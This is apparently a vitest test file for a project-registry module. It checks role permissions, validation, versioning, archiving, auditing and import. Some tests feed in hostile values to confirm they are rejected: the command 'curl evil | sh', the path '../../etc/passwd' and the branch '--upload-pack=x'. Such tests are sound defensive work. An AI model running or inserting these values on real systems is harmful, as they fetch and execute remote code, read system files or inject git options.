import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type { AdminCtx } from "./admin";
import { openDb } from "./db";
import { MAX_PROJECTS, createProject, getProject, importProjects, listProjects, setProjectArchived, setProjectEnabled, updateProject } from "./projects";
import { createUser, grantRole, type Role } from "./users";

let db: ReturnType<typeof openDb>;
const T0 = 1_000_000_000_000;
const ctx: AdminCtx = { ip: null, now: T0 };

function user(email: string, roles: Role[] = [], disabled = false): string {
  const id = createUser(db, { email, passwordHash: "x" }, T0);
  for (const r of roles) grantRole(db, id, r, null, T0);
  if (disabled) db.prepare("UPDATE users SET disabled_at = ? WHERE id = ?").run(T0, id);
  return id;
}

const actions = () => (db.prepare("SELECT action FROM audit_log ORDER BY id").all() as { action: string }[]).map((r) => r.action);
const lastDetail = () => JSON.parse((db.prepare("SELECT detail FROM audit_log ORDER BY id DESC LIMIT 1").get() as { detail: string }).detail) as Record<string, any>;

let admin: string;
let manager: string;
let member: string;
beforeEach(() => {
  db = openDb(":memory:");
  admin = user("admin@example.com", ["admin"]);
  manager = user("manager@example.com", ["issue-admin"]);
  member = user("member@example.com", ["viewer"]);
});

const base = { name: "demo", repo: "Owner/Demo" };

describe("createProject", () => {
  it("lets an Administrator add a project, enabled by default, and records it", () => {
    expect(createProject(db, admin, { ...base, commands: { test: "npm test" } }, ctx)).toEqual({ ok: true, name: "demo" });
    const p = getProject(db, "demo")!;
    expect(p).toMatchObject({ name: "demo", repo: "Owner/Demo", enabled: true, version: 1, stack: "other", defaultBranch: "main" });
    expect(p.commands.test).toBe("npm test");
    expect(actions()).toEqual(["project.created"]);
    expect(lastDetail()).toMatchObject({ name: "demo", repo: "Owner/Demo", enabled: true });
  });

  it("starts a Project manager's project switched off, whatever the form said", () => {
    expect(createProject(db, manager, { ...base, enabled: true }, ctx).ok).toBe(true);
    expect(getProject(db, "demo")!.enabled).toBe(false);
  });

  it("refuses commands from a Project manager, and records the attempt", () => {
    const r = createProject(db, manager, { ...base, commands: { build: "make" } }, ctx);
    expect(r).toEqual({ ok: false, error: expect.stringMatching(/Administrator/) });
    expect(getProject(db, "demo")).toBeUndefined();
    expect(actions()).toEqual(["admin.denied"]);
  });

  it("refuses a Member, a user without roles and a disabled Administrator", () => {
    const nobody = user("nobody@example.com");
    const gone = user("gone@example.com", ["admin"], true);
    for (const who of [member, nobody, gone]) {
      expect(createProject(db, who, base, ctx).ok).toBe(false);
    }
    expect(listProjects(db)).toEqual([]);
  });

  it("refuses an unknown actor id", () => {
    expect(createProject(db, "00000000-0000-0000-0000-000000000000", base, ctx).ok).toBe(false);
  });

  it("never accepts prompt paths", () => {
    expect(createProject(db, admin, { ...base, prompts: { builder: "prompts/mine.md" } }, ctx)).toEqual({ ok: false, error: expect.stringMatching(/Prompt/) });
    // and a path that leaves the repo does not even pass the schema
    expect(createProject(db, admin, { ...base, prompts: { builder: "../../etc/passwd" } }, ctx).ok).toBe(false);
  });

  it("refuses what the shared schema refuses", () => {
    for (const bad of [{ ...base, repo: "not a repo" }, { ...base, name: "Bad Name" }, { ...base, defaultBranch: "--upload-pack=x" }, { ...base, limits: { maxTurns: 101 } }, { ...base, commands: { test: "a\nb" } }, { ...base, extra: 1 }]) {
      const r = createProject(db, admin, bad, ctx);
      expect(r.ok).toBe(false);
    }
    expect(listProjects(db)).toEqual([]);
  });

  it("refuses a duplicate name and a duplicate repo, ignoring case", () => {
    expect(createProject(db, admin, base, ctx).ok).toBe(true);
    expect(createProject(db, admin, { name: "demo", repo: "Other/Thing" }, ctx)).toEqual({ ok: false, error: expect.stringMatching(/name/) });
    expect(createProject(db, admin, { name: "other", repo: "owner/DEMO" }, ctx)).toEqual({ ok: false, error: expect.stringMatching(/repository/) });
    expect(listProjects(db)).toHaveLength(1);
  });
});

describe("updateProject", () => {
  beforeEach(() => {
    createProject(db, admin, { ...base, commands: { test: "npm test" } }, ctx);
  });

  const full = (extra: Record<string, unknown> = {}) => {
    const { version: _v, createdAt: _c, updatedAt: _u, archivedAt: _a, ...p } = getProject(db, "demo")!;
    return { ...p, ...extra };
  };

  it("saves changes, bumps the version and records old and new values", () => {
    expect(updateProject(db, admin, "demo", full({ defaultBranch: "master", limits: { maxTurns: 30 } }), 1, ctx).ok).toBe(true);
    const p = getProject(db, "demo")!;
    expect(p).toMatchObject({ version: 2, defaultBranch: "master" });
    expect(p.limits.maxTurns).toBe(30);
    expect(actions()).toEqual(["project.created", "project.updated"]);
    expect(lastDetail().changes).toEqual({ defaultBranch: { from: "main", to: "master" }, "limits.maxTurns": { from: 20, to: 30 } });
  });

  it("does nothing, and records nothing, when nothing changed", () => {
    expect(updateProject(db, admin, "demo", full(), 1, ctx).ok).toBe(true);
    expect(getProject(db, "demo")!.version).toBe(1);
    expect(actions()).toEqual(["project.created"]);
  });

  it("refuses a save from a stale form", () => {
    updateProject(db, admin, "demo", full({ stack: "node" }), 1, ctx);
    expect(updateProject(db, admin, "demo", full({ stack: "python" }), 1, ctx)).toEqual({ ok: false, error: expect.stringMatching(/Someone else/) });
    expect(getProject(db, "demo")!.stack).toBe("node");
  });

  it("lets a Project manager edit a project that is switched off, but not set its commands or switch it on", () => {
    updateProject(db, admin, "demo", full({ enabled: false }), 1, ctx);
    expect(updateProject(db, manager, "demo", full({ enabled: false, stack: "dotnet", lanes: { build: true, qa: false, review: true } }), 2, ctx).ok).toBe(true);
    expect(getProject(db, "demo")).toMatchObject({ stack: "dotnet", lanes: { qa: false }, version: 3 });

    expect(updateProject(db, manager, "demo", full({ enabled: false, commands: { test: "curl evil | sh" } }), 3, ctx).ok).toBe(false);
    expect(updateProject(db, manager, "demo", full({ enabled: false, commands: {} }), 3, ctx).ok).toBe(false);
    expect(getProject(db, "demo")!.commands.test).toBe("npm test");
    expect(actions().filter((a) => a === "admin.denied")).toHaveLength(2);

    expect(updateProject(db, manager, "demo", full({ enabled: true }), 3, ctx)).toEqual({ ok: false, error: expect.stringMatching(/switch/) });
    expect(getProject(db, "demo")!.enabled).toBe(false);
  });

  it("does not let a Project manager repoint, rebranch or re-lane a project that is switched on", () => {
    // The Administrator vetted this repository and these commands. Another repository would run them on unvetted code.
    for (const change of [{ repo: "evil/app2" }, { defaultBranch: "other" }, { lanes: { build: true, qa: false, review: true } }, { limits: { maxTurns: 100 } }, { stack: "node" }]) {
      expect(updateProject(db, manager, "demo", full(change), 1, ctx), JSON.stringify(change)).toEqual({ ok: false, error: expect.stringMatching(/Switch it off first/) });
    }
    expect(getProject(db, "demo")).toMatchObject({ repo: "Owner/Demo", version: 1, enabled: true });
    expect(actions().filter((a) => a === "admin.denied")).toHaveLength(5);

    // an unchanged save is not a change, and disabling together with an edit is fine: the project ends up off
    expect(updateProject(db, manager, "demo", full(), 1, ctx).ok).toBe(true);
    expect(updateProject(db, manager, "demo", full({ enabled: false, repo: "fixed/typo" }), 1, ctx).ok).toBe(true);
    expect(getProject(db, "demo")).toMatchObject({ repo: "fixed/typo", enabled: false });

    // the Administrator can change a project that is on
    updateProject(db, admin, "demo", full({ enabled: true, repo: "Owner/Demo" }), 2, ctx);
    expect(updateProject(db, admin, "demo", full({ repo: "Owner/Other" }), 3, ctx).ok).toBe(true);
  });

  it("calls a stale form stale before it calls it an attempt, so no false denial is audited", () => {
    updateProject(db, admin, "demo", full({ commands: { test: "make test" } }), 1, ctx);
    const before = actions().length;
    expect(updateProject(db, manager, "demo", full({ commands: { test: "npm test" } }), 1, ctx)).toEqual({ ok: false, error: expect.stringMatching(/Someone else/) });
    expect(actions().length).toBe(before);
  });

  it("refuses a Member, a rename and a prompt change", () => {
    expect(updateProject(db, member, "demo", full({ stack: "node" }), 1, ctx).ok).toBe(false);
    expect(updateProject(db, admin, "demo", full({ name: "renamed" }), 1, ctx)).toEqual({ ok: false, error: expect.stringMatching(/name/) });
    expect(updateProject(db, admin, "demo", full({ prompts: { qa: "prompts/x.md" } }), 1, ctx)).toEqual({ ok: false, error: expect.stringMatching(/Prompt/) });
    expect(getProject(db, "demo")!.version).toBe(1);
  });

  it("refuses a repository that another project already uses", () => {
    createProject(db, admin, { name: "second", repo: "Owner/Second" }, ctx);
    expect(updateProject(db, admin, "demo", full({ repo: "owner/second" }), 1, ctx)).toEqual({ ok: false, error: expect.stringMatching(/repository/) });
  });

  it("reports a project that does not exist", () => {
    expect(updateProject(db, admin, "nope", { name: "nope", repo: "a/b" }, 1, ctx)).toEqual({ ok: false, error: "Project not found." });
  });
});

describe("createProject limits and the audit trail", () => {
  it("records the commands, lanes and limits of a new project", () => {
    createProject(db, admin, { ...base, commands: { build: "make", test: "make test" }, lanes: { qa: false }, limits: { maxTurns: 40 } }, ctx);
    expect(lastDetail()).toMatchObject({
      name: "demo",
      repo: "Owner/Demo",
      enabled: true,
      defaultBranch: "main",
      commands: { build: "make", test: "make test" },
      lanes: { build: true, qa: false, review: true },
      limits: { maxTurns: 40, maxReworks: 2 },
    });
  });

  it("stops at the project cap, so one account cannot fill the table with names that can never be removed", () => {
    const insert = db.prepare("INSERT INTO projects (name, repo, config, enabled, version, created_at, updated_at) VALUES (?, ?, '{}', 0, 1, 1, 1)");
    for (let i = 0; i < MAX_PROJECTS; i++) insert.run(`p${i}`, `o/p${i}`);
    expect(createProject(db, manager, base, ctx)).toEqual({ ok: false, error: expect.stringMatching(/already 200/) });
    expect(createProject(db, admin, base, ctx).ok).toBe(false);
  });

  it("names the right duplicate even when the row that is in the way no longer validates", () => {
    createProject(db, admin, base, ctx);
    db.prepare("UPDATE projects SET config = '{\"defaultBranch\":\"--bad\"}' WHERE name = 'demo'").run();
    expect(createProject(db, admin, { name: "demo", repo: "Other/Thing" }, ctx)).toEqual({ ok: false, error: expect.stringMatching(/name/) });
    expect(createProject(db, admin, { name: "other", repo: "owner/demo" }, ctx)).toEqual({ ok: false, error: expect.stringMatching(/repository/) });
  });
});

describe("setProjectEnabled", () => {
  beforeEach(() => {
    createProject(db, manager, base, ctx); // starts switched off
  });

  it("lets only an Administrator switch a project on", () => {
    expect(setProjectEnabled(db, manager, "demo", true, 1, ctx)).toEqual({ ok: false, error: expect.stringMatching(/Administrator/) });
    expect(getProject(db, "demo")!.enabled).toBe(false);
    expect(setProjectEnabled(db, admin, "demo", true, 1, ctx).ok).toBe(true);
    expect(getProject(db, "demo")).toMatchObject({ enabled: true, version: 2 });
    expect(actions()).toContain("project.enabled");
  });

  it("lets a Project manager switch it off again", () => {
    setProjectEnabled(db, admin, "demo", true, 1, ctx);
    expect(setProjectEnabled(db, manager, "demo", false, 2, ctx).ok).toBe(true);
    expect(getProject(db, "demo")!.enabled).toBe(false);
    expect(actions()).toContain("project.disabled");
  });

  it("refuses a stale version", () => {
    expect(setProjectEnabled(db, admin, "demo", true, 9, ctx)).toEqual({ ok: false, error: expect.stringMatching(/Someone else/) });
  });
});

describe("setProjectArchived", () => {
  beforeEach(() => {
    createProject(db, manager, base, ctx); // starts switched off
  });

  it("archives a switched-off project, hides it from the list and records it", () => {
    expect(setProjectArchived(db, admin, "demo", true, 1, ctx).ok).toBe(true);
    expect(listProjects(db)).toEqual([]);
    expect(listProjects(db, true).map((p) => p.name)).toEqual(["demo"]);
    expect(getProject(db, "demo")).toMatchObject({ version: 2, enabled: false, archivedAt: T0 });
    expect(actions()).toContain("project.archived");
  });

  it("refuses a switched-on project", () => {
    setProjectEnabled(db, admin, "demo", true, 1, ctx);
    expect(setProjectArchived(db, admin, "demo", true, 2, ctx)).toEqual({ ok: false, error: expect.stringMatching(/Switch the project off/) });
    expect(getProject(db, "demo")!.archivedAt).toBeNull();
  });

  it("refuses a Project manager, and records the attempt", () => {
    expect(setProjectArchived(db, manager, "demo", true, 1, ctx).ok).toBe(false);
    expect(getProject(db, "demo")!.archivedAt).toBeNull();
    expect(actions()).toContain("admin.denied");
  });

  it("refuses a stale version and an unknown project", () => {
    expect(setProjectArchived(db, admin, "demo", true, 9, ctx)).toEqual({ ok: false, error: expect.stringMatching(/Someone else/) });
    expect(setProjectArchived(db, admin, "nope", true, 1, ctx)).toEqual({ ok: false, error: expect.stringMatching(/not found/) });
  });

  it("restores a project, still switched off", () => {
    setProjectArchived(db, admin, "demo", true, 1, ctx);
    expect(setProjectArchived(db, admin, "demo", false, 2, ctx).ok).toBe(true);
    expect(listProjects(db).map((p) => p.name)).toEqual(["demo"]);
    expect(getProject(db, "demo")).toMatchObject({ enabled: false, archivedAt: null });
    expect(actions()).toContain("project.restored");
  });

  it("cannot be edited or switched on while archived", () => {
    setProjectArchived(db, admin, "demo", true, 1, ctx);
    expect(setProjectEnabled(db, admin, "demo", true, 2, ctx)).toEqual({ ok: false, error: expect.stringMatching(/archived/) });
  });

  it("keeps the name and repository reserved, and says where the project is", () => {
    setProjectArchived(db, admin, "demo", true, 1, ctx);
    expect(createProject(db, admin, base, ctx)).toEqual({ ok: false, error: expect.stringMatching(/name.*archive/) });
    expect(createProject(db, admin, { name: "other", repo: "owner/demo" }, ctx)).toEqual({ ok: false, error: expect.stringMatching(/repository.*archive/) });
  });
});

describe("the table", () => {
  it("never deletes a project", () => {
    createProject(db, admin, base, ctx);
    expect(() => db.prepare("DELETE FROM projects WHERE name = 'demo'").run()).toThrow(/never deleted/);
  });

  it("skips a stored row that no longer validates instead of failing the whole list", () => {
    createProject(db, admin, base, ctx);
    createProject(db, admin, { name: "other", repo: "Owner/Other" }, ctx);
    db.prepare("UPDATE projects SET config = '{\"defaultBranch\":\"--bad\"}' WHERE name = 'demo'").run();
    expect(listProjects(db).map((p) => p.name)).toEqual(["other"]);
  });
});

describe("importProjects", () => {
  let dir: string;
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "factory-import-"));
  });
  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  const file = (name: string, body: unknown) => writeFileSync(join(dir, name), typeof body === "string" ? body : JSON.stringify(body));
  const quiet = () => undefined;

  it("imports valid files into an empty table, once, and audits each", () => {
    file("alpha.json", { name: "alpha", repo: "o/alpha", limits: { maxTurns: 30 }, commands: { test: "npm test" } });
    file("beta.json", { name: "beta", repo: "o/beta", enabled: false });
    expect(importProjects(db, dir, quiet, T0)).toEqual({ imported: ["alpha", "beta"], skipped: [] });
    expect(getProject(db, "alpha")).toMatchObject({ limits: { maxTurns: 30 } });
    expect(actions()).toEqual(["project.imported", "project.imported"]);

    // a second start finds rows and changes nothing, even though the file now differs
    file("alpha.json", { name: "alpha", repo: "o/alpha", limits: { maxTurns: 99 } });
    expect(importProjects(db, dir, quiet, T0).imported).toEqual([]);
    expect(getProject(db, "alpha")!.limits.maxTurns).toBe(30);
  });

  it("switches every imported project off, whatever its file says, and records it", () => {
    file("alpha.json", { name: "alpha", repo: "o/alpha", enabled: true });
    file("beta.json", { name: "beta", repo: "o/beta" });
    importProjects(db, dir, quiet, T0);
    expect(listProjects(db).map((p) => p.enabled)).toEqual([false, false]);
    expect(lastDetail()).toMatchObject({ name: "beta", enabled: false });
  });

  it("skips a file that does not validate, names it, and still imports the rest", () => {
    file("good.json", { name: "good", repo: "o/good" });
    file("broken.json", "{ not json");
    file("wrongname.json", { name: "other", repo: "o/other" });
    file("toomany.json", { name: "toomany", repo: "o/toomany", limits: { maxTurns: 5000 } });
    const logs: string[] = [];
    const result = importProjects(db, dir, (m) => logs.push(m), T0);
    expect(result.imported).toEqual(["good"]);
    expect(result.skipped.sort()).toEqual(["broken.json", "toomany.json", "wrongname.json"]);
    expect(logs.filter((l) => l.includes("skipped"))).toHaveLength(3);
  });

  it("skips a second file for a repository that is already imported", () => {
    file("a.json", { name: "a", repo: "o/same" });
    file("b.json", { name: "b", repo: "O/SAME" });
    expect(importProjects(db, dir, quiet, T0)).toEqual({ imported: ["a"], skipped: ["b.json"] });
  });

  it("does nothing when the folder does not exist or is empty", () => {
    expect(importProjects(db, join(dir, "missing"), quiet, T0)).toEqual({ imported: [], skipped: [] });
    mkdirSync(join(dir, "sub"));
    expect(importProjects(db, dir, quiet, T0)).toEqual({ imported: [], skipped: [] });
  });
});
